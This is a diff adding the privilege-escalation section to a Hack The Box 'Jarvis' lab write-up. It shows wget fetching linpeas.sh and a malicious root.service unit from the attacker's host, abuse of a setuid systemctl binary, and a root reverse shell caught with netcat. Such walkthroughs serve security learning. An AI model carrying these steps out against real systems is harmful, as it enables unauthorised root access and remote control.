@@ -510,3 +510,130 @@ pepper@jarvis:~$ cat user.txt
 
 ## Privilege Escalation
 I decided to transfer `linpeas.sh` to the victim machine.
+
+So, I copied the file into my working directory and started a python server to host the file.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
+└─$ cp /usr/share/peass/linpeas/linpeas.sh .                                                                                                                                                       
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
+└─$ python -m http.server 5555 
+Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ...
+10.10.10.143 - - [16/Mar/2023 02:30:42] "GET /linpeas.sh HTTP/1.1" 200 -
+
+```
+
+Used `wget` to transfer the file to victim machine
+```
+pepper@jarvis:/tmp$ wget 10.10.14.8:5555/linpeas.sh
+wget 10.10.14.8:5555/linpeas.sh
+--2023-03-16 02:30:44--  http://10.10.14.8:5555/linpeas.sh
+Connecting to 10.10.14.8:5555... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828078 (809K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh          100%[===================>] 808.67K   475KB/s    in 1.7s    
+
+2023-03-16 02:30:46 (475 KB/s) - 'linpeas.sh' saved [828078/828078]
+```
+
+Gave it execute permissions.
+```
+chmod +x linpeas.sh
+```
+
+Ran the script
+
+```
+./linpeas.sh
+```
+
+I got back the following results 
+```
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                                                                                                            
+strace Not Found                                                                                                                                                                                                                                                                                                            
+-rwsr-xr-x 1 root root 31K Aug 21  2018 /bin/fusermount                                                                                                                                                                                                                                                                     
+-rwsr-xr-x 1 root root 44K Mar  7  2018 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-xr-x 1 root root 60K Nov 10  2016 /bin/ping
+-rwsr-x--- 1 root pepper 171K Feb 17  2019 /bin/systemctl
+-rwsr-xr-x 1 root root 31K Mar  7  2018 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root root 40K May 17  2017 /bin/su
+-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root root 59K May 17  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root root 75K May 17  2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 40K May 17  2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 138K Jun  5  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root root 49K May 17  2017 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 1 root root 431K Mar  1  2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root messagebus 42K Mar  2  2018 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+```
+
+The systemctl binary has the setuid bit set and it’s owned by root. So, I could easily use it to escalate to root privileges. I used [GTFObins](https://gtfobins.github.io/) to escalate my privileges.
+
+![image](https://user-images.githubusercontent.com/87711310/225534877-3035bc17-7454-45df-bb82-d7a6a391495d.png)
+
+There’s a good blog written by [Samual Whang](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49) explaining how to set up a service and use the misconfigured systemctl binary to send a privileged reverse shell back to our attack machine.
+
+
+
+```
+pepper@jarvis:/tmp$ wget http://10.10.14.8:5555/root.service
+wget http://10.10.14.8:5555/root.service
+--2023-03-16 02:39:53--  http://10.10.14.8:5555/root.service
+Connecting to 10.10.14.8:5555... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 171 [application/octet-stream]
+Saving to: 'root.service'
+
+root.service        100%[===================>]     171  --.-KB/s    in 0s      
+
+2023-03-16 02:39:53 (28.9 MB/s) - 'root.service' saved [171/171]
+```
+
+```
+pepper@jarvis:/tmp$ /bin/systemctl enable /home/pepper/root.service
+/bin/systemctl enable /home/pepper/root.service
+Failed to enable unit: File /home/pepper/root.service: No such file or directory
+pepper@jarvis:/tmp$ cp root.service /home/pepper/
+cp root.service /home/pepper/
+pepper@jarvis:/tmp$ ls /home/pepper
+ls /home/pepper
+Web  root.service  user.txt
+
+```
+
+```
+pepper@jarvis:~$ /bin/systemctl enable /home/pepper/root.service
+/bin/systemctl enable /home/pepper/root.service
+Created symlink /etc/systemd/system/multi-user.target.wants/root.service -> /home/pepper/root.service.
+```
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Jarvis]
+└─$ nc -lvnp 8881
+listening on [any] 8881 ...
+connect to [10.10.14.8] from (UNKNOWN) [10.10.10.143] 43064
+whoami
+root
+```
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+root@jarvis:/# ls
+ls
+bin   home            lib32       mnt   run   tmp      vmlinuz.old
+boot  initrd.img      lib64       opt   sbin  usr
+dev   initrd.img.old  lost+found  proc  srv   var
+etc   lib             media       root  sys   vmlinuz
+```
+
+```
+root@jarvis:/# cat root/root.txt
+cat root/root.txt
+[REDACTED]
+```
+
+
